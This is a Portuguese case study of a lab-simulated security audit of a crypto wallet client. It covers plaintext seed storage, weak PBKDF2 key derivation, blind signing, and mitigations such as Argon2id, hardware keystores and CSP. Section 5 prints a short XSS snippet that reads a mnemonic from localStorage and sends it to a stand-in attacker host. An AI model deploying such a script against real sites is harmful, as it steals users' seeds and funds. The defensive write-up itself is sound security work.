# Case Study — Wallet & Client-Side Security Review
**Tema:** Seed/Private Key, Signature Phishing & Local Storage Vulnerabilities

> [!NOTE]
> **Disclaimer:** Este documento descreve um estudo de caso simulado e executado em ambiente controlado de laboratório (CryptoSec Lab). Não representa um projeto realizado para um cliente real comercial, servindo exclusivamente para demonstrar nossa metodologia de auditoria técnica.

---

## 1. Contexto do Projeto
Muitos dos maiores incidentes de segurança Web3 não acontecem diretamente na blockchain, mas sim na camada do cliente (carteiras digitais, interfaces web e extensões de navegadores). Se uma extensão de carteira ou aplicação Web3 armazena chaves privadas sem criptografia forte ou permite que o usuário assine mensagens cegas (blind signing) sem exibir com clareza o impacto da transação, atacantes podem drenar os ativos dos usuários por meio de phishing de assinatura.

## 2. Escopo da Auditoria
*   **Componentes Auditados:** Lógica de criptografia de carteira, rotinas de geração de seed determinística e armazenamento local de dados do usuário.
*   **Tecnologias:** TypeScript, Bibliotecas Criptográficas Web (sjcl, tweetnacl), Armazenamento de Plataforma (LocalStorage/SecureStore).

## 3. Metodologia
Nossa análise focou na segurança da informação e engenharia reversa no lado do cliente:
1.  **Auditoria de Criptografia em Repouso:** Avaliação de como chaves privadas e frases semente (seeds) são salvas em disco.
2.  **Análise de Fluxo de Assinatura:** Avaliação de como as mensagens a serem assinadas são apresentadas ao usuário (phishing de transação).
3.  **Simulação de Ataques Locais e de Rede:** Tentativas de extração de segredos por engenharia reversa de memória ou leitura de arquivos locais.

## 4. Findings (Achados de Segurança)

### Achado 1: Armazenamento Inseguro de Sementes Criptográficas (Gravidade: Crítica)
*   **Descrição:** A chave privada descriptografada ou a semente mnemônica era mantida no LocalStorage do navegador em formato de texto puro (plaintext) por conveniência de desenvolvimento, permitindo que scripts maliciosos de terceiros (ataques XSS) extraíssem a semente facilmente.
*   **Localização:** Lógica de armazenamento local do cliente.

### Achado 2: Criptografia Fraca de Chaves com Senhas Curtas (Gravidade: Alta)
*   **Descrição:** A função de derivação de chaves (KDF) usada para encriptar a chave privada no lado do cliente utilizava poucas iterações de hashing (PBKDF2 simples), facilitando ataques de força bruta offline se o arquivo encriptado fosse roubado.
*   **Localização:** Módulo de gerenciamento de senhas da carteira.

### Achado 3: Assinatura Cega Sem Validação de Destino (Gravidade: Crítica)
*   **Descrição:** O fluxo de aprovação de assinatura permitia que o usuário assinasse mensagens arbítrias (como o método de aprovação ilimitada `approve()` ou mensagens estruturadas EIP-712 modificadas) sem alertar claramente que ele estava concedendo direitos de saque de todos os seus tokens para um contrato malicioso.
*   **Localização:** Interface de assinatura da carteira.

---

## 5. Exploit Simulation (Prova de Conceito)
No laboratório, simulamos a captura de dados locais. Executamos um script simulando uma injeção XSS que lê o `localStorage` do navegador e envia os segredos coletados para um servidor de comando e controle (C2) controlado pelo atacante.

```typescript
// Script malicioso simulado em ataque XSS
const leakedSeed = localStorage.getItem("user_mnemonic");
if (leakedSeed) {
    fetch("https://attacker-c2.xyz/collect", {
        method: "POST",
        body: JSON.stringify({ seed: leakedSeed })
    });
}
```
*   **Resultado do Lab:** Provou-se que qualquer vulnerabilidade simples em bibliotecas de terceiros importadas no frontend (Supply Chain Attack) expõe diretamente as chaves privadas do usuário final.

---

## 6. Impacto Comercial e Técnico
*   **Comprometimento em Massa de Usuários:** Roubo massivo de fundos de todos os clientes da carteira sem que haja qualquer falha nos contratos inteligentes da blockchain.
*   **Inviabilidade de Negócios:** Perda total de confiança do usuário e processos judiciais por negligência no tratamento de custódia de dados confidenciais.

---

## 7. Mitigação e Correções Aplicadas
Para corrigir essas vulnerabilidades, propusemos e validamos as seguintes contramedidas estruturais:

1.  **Criptografia Forte e Derivação de Chaves Avançada:** Substituição do armazenamento plano. As chaves privadas agora são derivadas usando **Argon2id** ou **scrypt** com altas iterações e encriptadas usando **AES-GCM-256** antes de serem salvas.
2.  **Uso de Enclaves Seguros:** Em aplicativos móveis, migramos o armazenamento de chaves para o **Keychain** (iOS) e **KeyStore** (Android) com isolamento físico de hardware. No navegador, as chaves nunca ficam persistidas de forma legível.
3.  **Simulação de Transação Visual:** Redesenhamos a interface da carteira para decodificar transações antes que o usuário assine, mostrando graficamente *"Você está permitindo que este endereço retire até X tokens da sua carteira"*, bloqueando blind signing.

---

## 8. Reteste e Validação
Validamos os mecanismos de criptografia local:
*   Testamos a resistência das senhas contra ferramentas de força bruta locais.
*   O script de injeção XSS local foi bloqueado pelas novas regras de Content Security Policy (CSP) e pelo isolamento de estado do frontend.

---

## 9. Lições de Negócio
*   **A Blockchain é apenas parte do problema:** O elo mais fraco é quase sempre o frontend ou o gerenciamento local de chaves.
*   **Design de UX de Segurança:** O usuário comum não compreende hashes hexadecimais de transação. Explicar o que uma assinatura faz de forma clara é uma obrigação do produto para evitar desastres.

---

## 10. Como se aplica a Engajamentos Reais
Em nossas consultorias de carteiras e aplicativos Web3:
*   Audita-se todo o fluxo de dados em memória do cliente.
*   Avaliamos as dependências de pacotes npm para prevenir ataques de cadeia de suprimentos (Supply Chain).
*   Revisamos a interface de usuário para garantir que o consentimento de transações seja explícito e compreensível.
